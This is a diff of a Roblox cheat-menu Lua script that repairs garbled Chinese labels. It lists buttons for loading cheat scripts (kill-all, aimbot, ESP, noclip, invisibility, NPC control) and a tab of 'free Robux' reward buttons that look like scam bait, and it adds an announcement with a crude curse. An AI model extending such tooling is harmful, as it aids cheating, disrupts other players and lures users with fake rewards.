+            {name = "FER15HeadlessButton", text = "FE R15无头", desc = "加载FE R15无头脚本"},
+            {name = "FEN00kla5KButton", text = "FE N00kla5K菜单", desc = "加载FE N00kla5K菜单脚本"},
+            -- 新添加的FE索尼克
+            {name = "FESonicButton", text = "FE索尼克", desc = "加载FE索尼克脚本"},
+            -- 新增FE功能
+            {name = "FEVillainButton", text = "FE反派本色", desc = "加载FE反派本色脚本"},
+            {name = "FESuperGirlButton", text = "FE女超人", desc = "加载FE女超人脚本"},
+            {name = "FEFreeAnimationButton", text = "FE免费动画包", desc = "加载FE免费动画包脚本"},
+            {name = "FEGetCoilsButton", text = "FE获取各种线圈脚本", desc = "加载FE获取各种线圈脚本"},
+            -- 新添加的FE恶魔
+            {name = "FEDemogorgonButton", text = "FE恶魔", desc = "加载FE恶魔脚本"},
+            -- 新添加的FEr6动作优化
+            {name = "FER6AnimationOptimizationButton", text = "FEr6动作优化", desc = "加载FEr6动作优化脚本"},
+            -- 新添加的FE堕落之神
+            {name = "FEFallenGodButton", text = "FE堕落之神", desc = "加载FE堕落之神脚本"},
+            -- 新添加的FE红色索尼克
+            {name = "FERedSonicButton", text = "FE红色索尼克", desc = "加载FE红色索尼克脚本"},
+            -- 新添加的FE exe索尼克
+            {name = "FEExeSonicButton", text = "FE exe索尼克", desc = "加载FE exe索尼克脚本"},
+            -- 新添加的FE小孩
+            {name = "FEChildButton", text = "FE小孩", desc = "加载FE小孩脚本"},
+            -- 新添加的FE机械人偶
+            {name = "FEMechanicalDollButton", text = "FE机械人偶", desc = "加载FE机械人偶脚本"},
+            -- 新添加的FE小汽车脚本
+            {name = "FECarScriptButton", text = "FE小汽车脚本", desc = "加载FE小汽车脚本"},
+            -- 新添加的FE1x4小弟
+            {name = "FE1x4MinionButton", text = "FE1x4小弟", desc = "加载FE1x4小弟脚本"},
+            -- 新添加的FE kill所有人
+            {name = "FEKillAllButton", text = "FE kill所有人", desc = "加载FE kill所有人脚本"},
+            -- 新添加的FE设置玩家大小
+            {name = "FESetPlayerSizeButton", text = "FE设置玩家大小", desc = "加载FE设置玩家大小脚本"},
+            -- 新添加的FE墨水人
+            {name = "FEInkManButton", text = "FE墨水人", desc = "加载FE墨水人脚本"},
+            -- 新添加的FE控制npcV2
+            {name = "FEControlNPCV2Button", text = "FE控制npcV2", desc = "加载FE控制npcV2脚本"},
+            -- 新添加的FE电磁枪
+            {name = "FEElectromagneticGunButton", text = "FE电磁枪", desc = "加载FE电磁枪脚本"},
+            -- 新添加的6个FE功能
+            {name = "FEDanceButton", text = "FE舞蹈", desc = "加载FE舞蹈脚本"},
+            {name = "FEClownButton", text = "FE小丑", desc = "加载FE小丑脚本"},
+            {name = "FEGiantDanceButton", text = "FE巨人跳舞", desc = "加载FE巨人跳舞脚本"},
+            {name = "FERunButton", text = "FE奔跑", desc = "加载FE奔跑脚本"},
+            {name = "FEScareButton", text = "FE惊吓", desc = "加载FE惊吓脚本"},
+            {name = "FEWeirdBodyButton", text = "FE奇怪体型", desc = "加载FE奇怪体型脚本"}
         },
-        ["榛戞礊鍔熻兘"] = {
-            {name = "BlackHoleV6Button", text = "榛戞礊v6", desc = "鍔犺浇榛戞礊v6鑴氭湰"},
-            {name = "BlackHoleV5Button", text = "榛戞礊v5", desc = "鍔犺浇榛戞礊v5鑴氭湰"},
-            {name = "BlackHoleV4Button", text = "榛戞礊v4", desc = "鍔犺浇榛戞礊v4鑴氭湰"},
-            {name = "BlackHoleV3Button", text = "榛戞礊v3", desc = "鍔犺浇榛戞礊v3鑴氭湰"},
-            {name = "BlackHoleV2Button", text = "榛戞礊v2", desc = "鍔犺浇榛戞礊v2鑴氭湰"},
-            {name = "BlackHoleV1Button", text = "榛戞礊v1", desc = "鍔犺浇榛戞礊v1鑴氭湰"}
+        ["黑洞功能"] = {
+            {name = "BlackHoleV6Button", text = "黑洞v6", desc = "加载黑洞v6脚本"},
+            {name = "BlackHoleV5Button", text = "黑洞v5", desc = "加载黑洞v5脚本"},
+            {name = "BlackHoleV4Button", text = "黑洞v4", desc = "加载黑洞v4脚本"},
+            {name = "BlackHoleV3Button", text = "黑洞v3", desc = "加载黑洞v3脚本"},
+            {name = "BlackHoleV2Button", text = "黑洞v2", desc = "加载黑洞v2脚本"},
+            {name = "BlackHoleV1Button", text = "黑洞v1", desc = "加载黑洞v1脚本"}
         },
-        ["鍏朵粬鑴氭湰"] = {
-            {name = "FakeLagButton", text = "鍋囧欢杩�", desc = "鍔犺浇鍋囧欢杩熻剼鏈�"},
-            {name = "DayunButton", text = "澶ц繍", desc = "鍔犺浇澶ц繍鑴氭湰"},
-            {name = "CrawlButton", text = "鍦ㄥ湴涓婄埇", desc = "鍔犺浇鍦ㄥ湴涓婄埇鑴氭湰"},
-            {name = "FEFighterButton", text = "寮鸿瑁呭鐗╁搧", desc = "寮鸿瑁呭鐗╁搧鑴氭湰"},
-            {name = "InvisibleButton", text = "浜虹墿闅愬舰鑴氭湰", desc = "鍔犺浇浜虹墿闅愬舰鑴氭湰"},
-            {name = "FakeFriendButton", text = "鍋囨湅鍙�", desc = "鐢熸垚鍋囨湅鍙婲PC"},
-            {name = "ChatDrawButton", text = "鍦ㄨ亰澶╂鐢荤敾", desc = "鍦ㄨ亰澶╂涓粯鍒跺浘妗�"},
-            {name = "TrainEffectButton", text = "鐏溅澶存晥鏋�", desc = "鍔犺浇鐏溅澶存晥鏋滆剼鏈�"},
-            {name = "FreePrivateServerButton", text = "鍏嶈垂绉佹湇", desc = "鍔犺浇鍏嶈垂绉佹湇鑴氭湰"},
-            {name = "CaodanButton", text = "鎿嶈泲", desc = "鍔犺浇鎿嶈泲鑴氭湰"},
-            {name = "CaodanV1Button", text = "鎿嶈泲v1", desc = "鍔犺浇鎿嶈泲v1鑴氭湰"},
-            {name = "ThrowFlyButton", text = "鐢╅鑴氭湰", desc = "鍔犺浇鐢╅鑴氭湰"},
-            {name = "BeatDogButton", text = "Kenny鎮︽湇寰幆鎵撶嫍", desc = "鍔犺浇Kenny鎮︽湇寰幆鎵撶嫍鑴氭湰"},
-            {name = "WitherStormButton", text = "鍑嬮浂椋庢毚", desc = "鍔犺浇鍑嬮浂椋庢毚鑴氭湰"},
-            {name = "BurstScriptButton", text = "鐖嗙噧鑴氭湰", desc = "鍔犺浇鐖嗙噧鑴氭湰"},
-            {name = "BootCheckButton", text = "寮€鏈烘娴�", desc = "鍔犺浇寮€鏈烘娴嬭剼鏈�"},
-            {name = "CalculatorButton", text = "璁＄畻鍣�", desc = "鍔犺浇璁＄畻鍣ㄨ剼鏈�"},
-            {name = "ChatBubbleBeautifyButton", text = "鑱婂ぉ姘旀场缇庡寲", desc = "鍔犺浇鑱婂ぉ姘旀场缇庡寲鑴氭湰"},
-            {name = "C00lkidBlackShellButton", text = "c00lkid榛戝３", desc = "鍔犺浇c00lkid榛戝３鑴氭湰"},
-            {name = "ChatTranslatorButton", text = "鑱婂ぉ缈昏瘧鍣�", desc = "鍔犺浇鑱婂ぉ缈昏瘧鍣ㄨ剼鏈�"},
-            {name = "KennyAutoTranslateButton", text = "kenny鑷姩姹夊寲", desc = "鍔犺浇kenny鑷姩姹夊寲鑴氭湰"},
-            {name = "MindPullButton", text = "蹇冪伒鐗靛紩", desc = "鍔犺浇蹇冪伒鐗靛紩鑴氭湰"},
-            {name = "TelepathyButton", text = "蹇冪伒鎰熷簲", desc = "鍔犺浇蹇冪伒鎰熷簲鑴氭湰"},
-            {name = "FishScriptButton", text = "楸艰剼鏈�", desc = "鍔犺浇楸艰剼鏈�"},
-            {name = "Forest99NightDiamondButton", text = "妫灄99澶滃埛閽荤煶", desc = "鍔犺浇妫灄99澶滃埛閽荤煶鑴氭湰"},
-            {name = "NicoNextbotButton", text = "nico' Nextbot", desc = "鍔犺浇nico' Nextbot鑴氭湰"},
-            {name = "ShipTreasureButton", text = "閫犺埞瀵诲疂", desc = "鍔犺浇閫犺埞瀵诲疂鑴氭湰"},
-            {name = "SpeedLegendButton", text = "鏋侀€熶紶濂�", desc = "鍔犺浇鏋侀€熶紶濂囪剼鏈�"},
-            {name = "WallRunButton", text = "椋炴獝璧板", desc = "鍔犺浇椋炴獝璧板鑴氭湰"},
-            {name = "NaturalDisasterButton", text = "鑷劧鐏惧", desc = "鍔犺浇鑷劧鐏惧鑴氭湰"},
-            {name = "MuscleLegendButton", text = "鍔涢噺浼犲", desc = "鍔犺浇鍔涢噺浼犲鑴氭湰"},
-            {name = "MuscleLegendChangeButton", text = "鍔涢噺浼犲鏀瑰姏閲�", desc = "鍔犺浇鍔涢噺浼犲鏀瑰姏閲忚剼鏈�"},
-            {name = "PlayForsakenOnServerButton", text = "鍦ㄦ湇鍔″櫒鐜╄閬楀純鑴氭湰", desc = "鍦ㄦ湇鍔″櫒鐜╄閬楀純鑴氭湰"},
-            -- 鏂版坊鍔犵殑涓嶇煡鍚嶉粦澹宠剼鏈�
-            {name = "UnknownBlackShellButton", text = "涓嶇煡鍚嶉粦澹宠剼鏈�", desc = "鍔犺浇涓嶇煡鍚嶉粦澹宠剼鏈�"},
-            -- 鏂板鍏ㄥ眬鑱婂ぉ鑴氭湰
-            {name = "GlobalChatButton", text = "鍏ㄥ眬鑱婂ぉ鑴氭湰", desc = "鍔犺浇鍏ㄥ眬鑱婂ぉ鑴氭湰"}
+        ["其他脚本"] = {
+            {name = "FakeLagButton", text = "假延迟", desc = "加载假延迟脚本"},
+            {name = "DayunButton", text = "大运", desc = "加载大运脚本"},
+            {name = "CrawlButton", text = "在地上爬", desc = "加载在地上爬脚本"},
+            {name = "FEFighterButton", text = "强行装备物品", desc = "强行装备物品脚本"},
+            {name = "InvisibleButton", text = "人物隐形脚本", desc = "加载人物隐形脚本"},
+            {name = "FakeFriendButton", text = "假朋友", desc = "生成假朋友NPC"},
+            {name = "ChatDrawButton", text = "在聊天框画画", desc = "在聊天框中绘制图案"},
+            {name = "TrainEffectButton", text = "火车头效果", desc = "加载火车头效果脚本"},
+            {name = "FreePrivateServerButton", text = "免费私服", desc = "加载免费私服脚本"},
+            {name = "CaodanButton", text = "操蛋", desc = "加载操蛋脚本"},
+            {name = "CaodanV1Button", text = "操蛋v1", desc = "加载操蛋v1脚本"},
+            {name = "ThrowFlyButton", text = "甩飞脚本", desc = "加载甩飞脚本"},
+            {name = "BeatDogButton", text = "Kenny悦服循环打狗", desc = "加载Kenny悦服循环打狗脚本"},
+            {name = "WitherStormButton", text = "凋零风暴", desc = "加载凋零风暴脚本"},
+            {name = "BurstScriptButton", text = "爆燃脚本", desc = "加载爆燃脚本"},
+            {name = "BootCheckButton", text = "开机检测", desc = "加载开机检测脚本"},
+            {name = "CalculatorButton", text = "计算器", desc = "加载计算器脚本"},
+            {name = "ChatBubbleBeautifyButton", text = "聊天气泡美化", desc = "加载聊天气泡美化脚本"},
+            {name = "C00lkidBlackShellButton", text = "c00lkid黑壳", desc = "加载c00lkid黑壳脚本"},
+            {name = "ChatTranslatorButton", text = "聊天翻译器", desc = "加载聊天翻译器脚本"},
+            {name = "KennyAutoTranslateButton", text = "kenny自动汉化", desc = "加载kenny自动汉化脚本"},
+            {name = "MindPullButton", text = "心灵牵引", desc = "加载心灵牵引脚本"},
+            {name = "TelepathyButton", text = "心灵感应", desc = "加载心灵感应脚本"},
+            {name = "FishScriptButton", text = "鱼脚本", desc = "加载鱼脚本"},
+            {name = "Forest99NightDiamondButton", text = "森林99夜刷钻石", desc = "加载森林99夜刷钻石脚本"},
+            {name = "NicoNextbotButton", text = "nico' Nextbot", desc = "加载nico' Nextbot脚本"},
+            {name = "ShipTreasureButton", text = "造船寻宝", desc = "加载造船寻宝脚本"},
+            {name = "SpeedLegendButton", text = "极速传奇", desc = "加载极速传奇脚本"},
+            {name = "WallRunButton", text = "飞檐走壁", desc = "加载飞檐走壁脚本"},
+            {name = "NaturalDisasterButton", text = "自然灾害", desc = "加载自然灾害脚本"},
+            {name = "MuscleLegendButton", text = "力量传奇", desc = "加载力量传奇脚本"},
+            {name = "MuscleLegendChangeButton", text = "力量传奇改力量", desc = "加载力量传奇改力量脚本"},
+            {name = "PlayForsakenOnServerButton", text = "在服务器玩被遗弃脚本", desc = "在服务器玩被遗弃脚本"},
+            -- 新添加的不知名黑壳脚本
+            {name = "UnknownBlackShellButton", text = "不知名黑壳脚本", desc = "加载不知名黑壳脚本"},
+            -- 新增全局聊天脚本
+            {name = "GlobalChatButton", text = "全局聊天脚本", desc = "加载全局聊天脚本"}
         },
         ["doors"] = {
-            {name = "DoorsButton", text = "doors", desc = "鍔犺浇doors鑴氭湰"},
-            {name = "DoorsModeButton", text = "doors妯″紡", desc = "鍔犺浇doors妯″紡鑴氭湰"},
-            {name = "DoorsHardcoreModeButton", text = "doors纭牳妯″紡", desc = "鍔犺浇doors纭牳妯″紡鑴氭湰"},
-            {name = "DoorsAutoAvoidButton", text = "doors鑷姩韬叉€叏鍥鹃珮浜�", desc = "鍔犺浇doors鑷姩韬叉€叏鍥鹃珮浜剼鏈�"},
-            {name = "DoorsExtremeModeButton", text = "doors鏋佺妯″紡", desc = "鍔犺浇doors鏋佺妯″紡鑴氭湰"}
+            {name = "DoorsButton", text = "doors", desc = "加载doors脚本"},
+            {name = "DoorsModeButton", text = "doors模式", desc = "加载doors模式脚本"},
+            {name = "DoorsHardcoreModeButton", text = "doors硬核模式", desc = "加载doors硬核模式脚本"},
+            {name = "DoorsAutoAvoidButton", text = "doors自动躲怪全图高亮", desc = "加载doors自动躲怪全图高亮脚本"},
+            {name = "DoorsExtremeModeButton", text = "doors极端模式", desc = "加载doors极端模式脚本"}
         },
-        ["鍋疯蛋鑴戠孩"] = {
-            {name = "StealBrainRedButton", text = "鍋疯蛋鑴戠孩", desc = "鍔犺浇鍋疯蛋鑴戠孩鑴氭湰"},
-            {name = "StealBrainRedRainbowButton", text = "鍋疯蛋鑴戠孩褰╄櫣鏉�", desc = "鍔犺浇鍋疯蛋鑴戠孩褰╄櫣鏉胯剼鏈�"},
-            {name = "StealBrainRedBigBoardButton", text = "鍋疯蛋鑴戠孩澶ф澘瀛�", desc = "鍔犺浇鍋疯蛋鑴戠孩澶ф澘瀛愯剼鏈�"}
+        ["偷走脑红"] = {
+            {name = "StealBrainRedButton", text = "偷走脑红", desc = "加载偷走脑红脚本"},
+            {name = "StealBrainRedRainbowButton", text = "偷走脑红彩虹板", desc = "加载偷走脑红彩虹板脚本"},
+            {name = "StealBrainRedBigBoardButton", text = "偷走脑红大板子", desc = "加载偷走脑红大板子脚本"}
         },
-        ["绉嶆鑺卞洯"] = {
-            {name = "GardenButton", text = "绉嶆鑺卞洯", desc = "鍔犺浇绉嶆鑺卞洯鑴氭湰"}
+        ["种植花园"] = {
+            {name = "GardenButton", text = "种植花园", desc = "加载种植花园脚本"}
         },
-        ["鍏朵粬鑴氭湰鏁村悎"] = {
-            {name = "PiScriptButton", text = "鐨剼鏈�", desc = "鍔犺浇鐨剼鏈�"},
-            {name = "PiScriptTestButton", text = "鐨剼鏈祴璇曠増", desc = "鍔犺浇鐨剼鏈祴璇曠増"},
-            {name = "YeScriptButton", text = "鍙惰剼鏈�", desc = "鍔犺浇鍙惰剼鏈�"},
-            {name = "ChuScriptButton", text = "鍒濊剼鏈�", desc = "鍔犺浇鍒濊剼鏈�"},
-            {name = "DingScriptButton", text = "涓佽剼鏈�", desc = "鍔犺浇涓佽剼鏈�"},
-            {name = "ScriptCenterButton", text = "鑴氭湰涓績", desc = "鍔犺浇鑴氭湰涓績"},
-            {name = "XAScriptCenterButton", text = "xa鑴氭湰涓績", desc = "鍔犺浇xa鑴氭湰涓績"},
-            {name = "ChenScriptButton", text = "杈拌剼鏈�", desc = "鍔犺浇杈拌剼鏈�"},
-            {name = "ShaScriptButton", text = "娌欒剼鏈�", desc = "鍔犺浇娌欒剼鏈�"},
-            -- 鏂版坊鍔犵殑unx鑴氭湰
-            {name = "UNXScriptButton", text = "unx鑴氭湰", desc = "鍔犺浇unx鑴氭湰"},
-            -- 浠庡熀纭€鍔熻兘绉诲姩杩囨潵鐨勫绠′腑蹇�
-            {name = "ConduitCenterButton", text = "瀵肩涓績", desc = "鍔犺浇瀵肩涓績鑴氭湰"},
-            -- 鏂版坊鍔犵殑鍔熻兘
-            {name = "SuperNBForeignScriptButton", text = "瓒呯骇NB鑰佸鑴氭湰", desc = "鍔犺浇瓒呯骇NB鑰佸鑴氭湰"},
-            {name = "BSCenterButton", text = "bs涓績", desc = "鍔犺浇bs涓績鑴氭湰"},
-            -- 鏂板钀藉彾涓績
-            {name = "FallenLeavesCenterButton", text = "钀藉彾涓績", desc = "鍔犺浇钀藉彾涓績鑴氭湰"},
-            -- 鏂版坊鍔犵殑rob鑴氭湰
-            {name = "ROBScriptButton", text = "rob鑴氭湰", desc = "鍔犺浇rob鑴氭湰"}
+        ["其他脚本整合"] = {
+            {name = "PiScriptButton", text = "皮脚本", desc = "加载皮脚本"},
+            {name = "PiScriptTestButton", text = "皮脚本测试版", desc = "加载皮脚本测试版"},
+            {name = "YeScriptButton", text = "叶脚本", desc = "加载叶脚本"},
+            {name = "ChuScriptButton", text = "初脚本", desc = "加载初脚本"},
+            {name = "DingScriptButton", text = "丁脚本", desc = "加载丁脚本"},
+            {name = "ScriptCenterButton", text = "脚本中心", desc = "加载脚本中心"},
+            {name = "XAScriptCenterButton", text = "xa脚本中心", desc = "加载xa脚本中心"},
+            {name = "ChenScriptButton", text = "辰脚本", desc = "加载辰脚本"},
+            {name = "ShaScriptButton", text = "沙脚本", desc = "加载沙脚本"},
+            -- 新添加的unx脚本
+            {name = "UNXScriptButton", text = "unx脚本", desc = "加载unx脚本"},
+            -- 从基础功能移动过来的导管中心
+            {name = "ConduitCenterButton", text = "导管中心", desc = "加载导管中心脚本"},
+            -- 新添加的功能
+            {name = "SuperNBForeignScriptButton", text = "超级NB老外脚本", desc = "加载超级NB老外脚本"},
+            {name = "BSCenterButton", text = "bs中心", desc = "加载bs中心脚本"},
+            -- 新增落叶中心
+            {name = "FallenLeavesCenterButton", text = "落叶中心", desc = "加载落叶中心脚本"},
+            -- 新添加的rob脚本
+            {name = "ROBScriptButton", text = "rob脚本", desc = "加载rob脚本"}
         },
-        ["淇勪亥淇勫窞"] = {
-            -- 灏嗘墍鏈変縿浜ヤ縿宸炵浉鍏宠剼鏈Щ鍔ㄥ埌杩欓噷
-            {name = "OhioButton", text = "淇勪亥淇勫窞鑴氭湰", desc = "鍔犺浇淇勪亥淇勫窞鑴氭湰"},
-            {name = "Ohio2Button", text = "淇勪亥淇勫窞鑴氭湰2", desc = "鍔犺浇淇勪亥淇勫窞鑴氭湰2"},
-            {name = "XAOhioButton", text = "xa淇勪亥淇勫窞", desc = "鍔犺浇xa淇勪亥淇勫窞鑴氭湰"}
+        ["俄亥俄州"] = {
+            -- 将所有俄亥俄州相关脚本移动到这里
+            {name = "OhioButton", text = "俄亥俄州脚本", desc = "加载俄亥俄州脚本"},
+            {name = "Ohio2Button", text = "俄亥俄州脚本2", desc = "加载俄亥俄州脚本2"},
+            {name = "XAOhioButton", text = "xa俄亥俄州", desc = "加载xa俄亥俄州脚本"}
         },
-        ["鐢绘垜"] = {
-            -- 灏嗘墍鏈夌敾鎴戠浉鍏宠剼鏈Щ鍔ㄥ埌杩欓噷
-            {name = "DrawMeScript1Button", text = "鐢绘垜鑴氭湰1", desc = "鍔犺浇鐢绘垜鑴氭湰1"},
-            {name = "DrawMeScript2Button", text = "鐢绘垜鑴氭湰2", desc = "鍔犺浇鐢绘垜鑴氭湰2"},
-            {name = "DrawMeScript3Button", text = "鐢绘垜鑴氭湰3", desc = "鍔犺浇鐢绘垜鑴氭湰3"},
-            {name = "ChatDrawButton", text = "鍦ㄨ亰澶╂鐢荤敾", desc = "鍦ㄨ亰澶╂涓粯鍒跺浘妗�"}
+        ["画我"] = {
+            -- 将所有画我相关脚本移动到这里
+            {name = "DrawMeScript1Button", text = "画我脚本1", desc = "加载画我脚本1"},
+            {name = "DrawMeScript2Button", text = "画我脚本2", desc = "加载画我脚本2"},
+            {name = "DrawMeScript3Button", text = "画我脚本3", desc = "加载画我脚本3"},
+            {name = "ChatDrawButton", text = "在聊天框画画", desc = "在聊天框中绘制图案"}
         },
-        ["鍏嶈垂r甯�"] = {
-            {name = "Free80RButton", text = "鍏嶈垂80r鍩规牴鐙", desc = "鐐瑰嚮鑾峰彇鍏嶈垂80r甯佸鍔�"},
-            {name = "Free120RButton", text = "鍏嶈垂120r鍩规牴鐙", desc = "鐐瑰嚮鑾峰彇鍏嶈垂120r甯佸鍔�"},
-            {name = "Free240RButton", text = "鍏嶈垂240r鍩规牴鐙", desc = "鐐瑰嚮鑾峰彇鍏嶈垂240r甯佸鍔�"},
-            {name = "Free400RButton", text = "鍏嶈垂400r鍩规牴鐙", desc = "鐐瑰嚮鑾峰彇鍏嶈垂400r甯佸鍔�"},
-            {name = "Free500RButton", text = "鍏嶈垂500r鍩规牴鐙", desc = "鐐瑰嚮鑾峰彇鍏嶈垂500r甯佸鍔�"},
-            {name = "Free1000RButton", text = "鍏嶈垂1000r鍩规牴鐙", desc = "鐐瑰嚮鑾峰彇鍏嶈垂1000r甯佸鍔�"},
-            {name = "Free450RPlusButton", text = "鍏嶈垂450r+涓€涓湀浼氬憳鍩规牴鐙", desc = "鐐瑰嚮鑾峰彇鍏嶈垂450r甯�+涓€涓湀浼氬憳"},
-            {name = "Free1200RPlusButton", text = "鍏嶈垂1200r+涓€涓湀浼氬憳鍩规牴鐙", desc = "鐐瑰嚮鑾峰彇鍏嶈垂1200r甯�+涓€涓湀浼氬憳"}
+        ["免费r币"] = {
+            {name = "Free80RButton", text = "免费80r培根独家", desc = "点击获取免费80r币奖励"},
+            {name = "Free120RButton", text = "免费120r培根独家", desc = "点击获取免费120r币奖励"},
+            {name = "Free240RButton", text = "免费240r培根独家", desc = "点击获取免费240r币奖励"},
+            {name = "Free400RButton", text = "免费400r培根独家", desc = "点击获取免费400r币奖励"},
+            {name = "Free500RButton", text = "免费500r培根独家", desc = "点击获取免费500r币奖励"},
+            {name = "Free1000RButton", text = "免费1000r培根独家", desc = "点击获取免费1000r币奖励"},
+            {name = "Free450RPlusButton", text = "免费450r+一个月会员培根独家", desc = "点击获取免费450r币+一个月会员"},
+            {name = "Free1200RPlusButton", text = "免费1200r+一个月会员培根独家", desc = "点击获取免费1200r币+一个月会员"}
         },
-        ["姝讳骸涔嬫"] = {
-            {name = "DeathOfDeathButton", text = "姝讳骸涔嬫", desc = "鍔犺浇姝讳骸涔嬫鑴氭湰"}
+        ["死亡之死"] = {
+            {name = "DeathOfDeathButton", text = "死亡之死", desc = "加载死亡之死脚本"}
         },
-        ["琚仐寮�"] = {
-            {name = "ForsakenButton", text = "琚仐寮冭剼鏈�", desc = "鍔犺浇琚仐寮冭剼鏈�"},
-            {name = "ForsakenScript2Button", text = "琚仐寮冭剼鏈簩", desc = "鍔犺浇琚仐寮冭剼鏈簩"}
+        ["被遗弃"] = {
+            {name = "ForsakenButton", text = "被遗弃脚本", desc = "加载被遗弃脚本"},
+            {name = "ForsakenScript2Button", text = "被遗弃脚本二", desc = "加载被遗弃脚本二"}
         },
-        ["鏃犳晫灏戜緺椋炶"] = {
-            {name = "InvincibleFlyR15Button", text = "鏃犳晫灏戜緺椋炶r15", desc = "R15瑙掕壊鏃犳晫椋炶妯″紡"},
-            {name = "InvincibleFlyR6Button", text = "鏃犳晫灏戜緺椋炶r6", desc = "R6瑙掕壊鏃犳晫椋炶妯″紡"}
+        ["无敌少侠飞行"] = {
+            {name = "InvincibleFlyR15Button", text = "无敌少侠飞行r15", desc = "R15角色无敌飞行模式"},
+            {name = "InvincibleFlyR6Button", text = "无敌少侠飞行r6", desc = "R6角色无敌飞行模式"}
         }
     }
 
-    -- 鍒涘缓鎸夐挳
+    -- 创建按钮
     local ButtonInstances = {}
     local ButtonFrames = {}
     
@@ -548,7 +548,7 @@ local function loadScript()
         end
     end
 
-    -- 鍏憡鍐呭妗嗘灦
+    -- 公告内容框架
     local AnnouncementScrolling = Instance.new("ScrollingFrame")
     AnnouncementScrolling.Size = UDim2.new(1, -6.7, 1, -6.7)
     AnnouncementScrolling.Position = UDim2.new(0, 3.3, 0, 3.3)
@@ -568,27 +568,27 @@ local function loadScript()
     Instance.new("UIPadding", AnnouncementScrolling).PaddingRight = UDim.new(0, 5)
     Instance.new("UIPadding", AnnouncementScrolling).PaddingTop = UDim.new(0, 5)
     
-    -- 鑾峰彇鐜╁璐︽埛骞撮緞
-    local playerAge = "鏈煡"
+    -- 获取玩家账户年龄
+    local playerAge = "未知"
     local success, ageResult = pcall(function()
         return LocalPlayer.AccountAge
     end)
     if success then
-        playerAge = tostring(ageResult) .. " 澶�"
+        playerAge = tostring(ageResult) .. " 天"
     end
     
-    -- 鍏憡鏂囨湰鍐呭
+    -- 公告文本内容
     local announcementLines = {
-        "姝よ剼鏈负缂濆悎瀹屽叏鍏嶈垂锛岀姝㈠€掑崠锛屽€掑崠姝诲叏瀹跺叏瀹舵搷閫�",
+        "此脚本为缝合完全免费，禁止倒卖，倒卖死全家全家操逼",
         "",
-        "鐜╁鍚嶅瓧: " .. LocalPlayer.Name,
+        "玩家名字: " .. LocalPlayer.Name,
         "",
-        "鐜╁璐︽埛骞撮緞: " .. playerAge,
-        "鑴氭湰鍔犺浇寤惰繜鎴栬€呭姞杞戒笉鍑烘潵涓嶆槸鎴戠殑闂",
+        "玩家账户年龄: " .. playerAge,
+        "脚本加载延迟或者加载不出来不是我的问题",
         ""
     }
     
-    -- 鍒涘缓鍏憡鏂囨湰
+    -- 创建公告文本
     for i, line in ipairs(announcementLines) do
         local textLabel = Instance.new("TextLabel")
         textLabel.Size = UDim2.new(1, 0, 0, 20)
@@ -602,14 +602,14 @@ local function loadScript()
         textLabel.Parent = AnnouncementScrolling
     end
     
-    -- 鍒涘缓绁炵鐚浘鐗囨鏋�
+    -- 创建神秘猫图片框架
     local catImageFrame = Instance.new("Frame")
     catImageFrame.Size = UDim2.new(1, 0, 0, 90)
     catImageFrame.BackgroundTransparency = 1
     catImageFrame.LayoutOrder = #AnnouncementScrolling:GetChildren()
     catImageFrame.Parent = AnnouncementScrolling
     
-    -- 绁炵鐚浘鐗�
+    -- 神秘猫图片
     local catImage = Instance.new("ImageLabel")
     catImage.Size = UDim2.new(1, 0, 0, 70)
     catImage.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
@@ -622,23 +622,23 @@ local function loadScript()
     catStroke.Color = Color3.fromRGB(100, 100, 200)
     catImage.Parent = catImageFrame
     
-    -- 鍥剧墖搴曚笅鐨勬枃瀛�
+    -- 图片底下的文字
     local catText = Instance.new("TextLabel")
     catText.Size = UDim2.new(1, 0, 0, 20)
     catText.Position = UDim2.new(0, 0, 0, 70)
     catText.BackgroundTransparency = 1
-    catText.Text = "绁炵鐨勭尗"
+    catText.Text = "神秘的猫"
     catText.TextColor3 = Color3.fromRGB(200, 200, 255)
     catText.TextSize = 12
     catText.Font = Enum.Font.GothamBold
     catText.ZIndex = 5
     catText.Parent = catImageFrame
     
-    -- 鏈€鍚庝竴琛屾枃鏈�
+    -- 最后一行文本
     local lastText = Instance.new("TextLabel")
     lastText.Size = UDim2.new(1, 0, 0, 20)
     lastText.BackgroundTransparency = 1
-    lastText.Text = "鑴氭湰浣滆€�: Bacon head"
+    lastText.Text = "脚本作者: Bacon head"
     lastText.TextColor3 = Color3.fromRGB(255, 255, 255)
     lastText.TextSize = 14
     lastText.Font = Enum.Font.GothamBold
@@ -646,24 +646,24 @@ local function loadScript()
     lastText.ZIndex = 5
     lastText.Parent = AnnouncementScrolling
     
-    -- 閫夐」鍗″垏鎹�
+    -- 选项卡切换
     for tabName, tabButton in pairs(TabButtons) do
         tabButton.MouseButton1Click:Connect(function()
             CurrentTab = tabName
             
-            if tabName == "鍏憡" then
+            if tabName == "公告" then
                 AnnouncementScrolling.Visible = true
                 ContentScrolling.Visible = false
             else
                 AnnouncementScrolling.Visible = false
                 ContentScrolling.Visible = true
                 
-                -- 闅愯棌鎵€鏈夋寜閽�
+                -- 隐藏所有按钮
                 for name, frame in pairs(ButtonFrames) do
                     frame.Visible = false
                 end
                 
-                -- 鏄剧ず褰撳墠閫夐」鍗＄殑鎸夐挳
+                -- 显示当前选项卡的按钮
                 if FunctionTabs[tabName] then
                     for _, func in ipairs(FunctionTabs[tabName]) do
                         if ButtonFrames[func.name] then
@@ -673,7 +673,7 @@ local function loadScript()
                 end
             end
             
-            -- 鏇存柊閫夐」鍗℃寜閽鑹�
+            -- 更新选项卡按钮颜色
             for tName, tButton in pairs(TabButtons) do
                 if tName == tabName then
                     tButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
@@ -686,13 +686,13 @@ local function loadScript()
         end)
     end
 
-    -- 榛樿鏄剧ず鍏憡
-    TabButtons["鍏憡"].BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-    TabButtons["鍏憡"].TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- 默认显示公告
+    TabButtons["公告"].BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    TabButtons["公告"].TextColor3 = Color3.fromRGB(255, 255, 255)
     AnnouncementScrolling.Visible = true
     ContentScrolling.Visible = false
 
-    -- 鍔熻兘鍙橀噺
+    -- 功能变量
     local noclip, infiniteJump, spinning, flying, showCollision = false, false, false, false, false
     local sitSpinning, ridingHead, playerESPEnabled = false, false, false
     local climbing, autoMove, nightVision, aimbotEnabled = false, false, false, false
@@ -702,16 +702,16 @@ local function loadScript()
     local originalColors = {}
     local originalLightingSettings = {}
     local aimbotTarget = nil
-    local aimToHead = true -- 榛樿鐬勫噯澶撮儴
